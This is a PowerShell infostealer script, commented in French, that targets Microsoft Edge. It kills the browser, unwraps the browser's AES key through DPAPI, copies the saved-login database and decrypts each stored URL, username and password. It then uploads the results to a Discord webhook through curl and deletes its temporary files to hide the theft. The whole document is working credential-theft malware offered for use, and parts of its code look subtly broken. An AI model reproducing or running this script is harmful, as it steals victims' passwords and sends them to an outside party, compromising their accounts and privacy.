$wh="https://discord.com/api/webhooks/XXXXX/XXXXX"

# Kill Edge
taskkill /F /IM msedge.exe 2>$null
Start-Sleep -Seconds 2

$edgeRoot = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
$loginData = "$edgeRoot\Default\Login Data"
$localState = "$edgeRoot\Local State"

if (!(Test-Path $loginData) -or !(Test-Path $localState)) {
    exit
}

# --- Récupération de la clé AES ---
$ls = Get-Content -Raw $localState | ConvertFrom-Json
$rawKey = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)

if ([Text.Encoding]::ASCII.GetString($rawKey[0..4]) -ne "DPAPI") {
    exit
}

$dpapiBlob = $rawKey[5..($rawKey.Length-1)]
$aesKey = [Security.Cryptography.ProtectedData]::Unprotect(
    $dpapiBlob, $null,
    [Security.Cryptography.DataProtectionScope]::CurrentUser
)

# --- Copie DB (SQLite verrouillée sinon) ---
$tmpDb = "$env:TEMP\edge.db"
Copy-Item $loginData $tmpDb -Force

Add-Type -AssemblyName System.Data
$conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmpDb;Version=3;")
$conn.Open()

$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
$r = $cmd.ExecuteReader()

$out = "$env:TEMP\edge_passwords.txt"
"" | Set-Content $out

while ($r.Read()) {
    $url = $r.GetString(0)
    $user = $r.GetString(1)
    $enc  = $r.GetValue(2)

    if ($enc.Length -lt 20) { continue }

    $ver = [Text.Encoding]::ASCII.GetString($enc[0..2])

    if ($ver -in @("v10","v11","v20")) {
        $nonce = $enc[3..14]
        $cipher = $enc[15..($enc.Length-17)]
        $tag = $enc[($enc.Length-16)..($enc.Length-1)]

        $aes = [Security.Cryptography.Aes]::Create()
        $aes.Mode = "GCM"

        try {
            $pt = New-Object byte[] $cipher.Length
            $aesgcm = New-Object Security.Cryptography.AesGcm($aesKey)
            $aesgcm.Decrypt($nonce, $cipher, $tag, $pt)
            $pass = [Text.Encoding]::UTF8.GetString($pt)

            Add-Content $out "URL: $url"
            Add-Content $out "USER: $user"
            Add-Content $out "PASS: $pass"
            Add-Content $out "----"
        } catch {}
    }
}

$conn.Close()

# Exfil
curl.exe -F "file=@$out" -F "content=**Edge passwords from $env:COMPUTERNAME**" $wh

Remove-Item $out,$tmpDb -Force
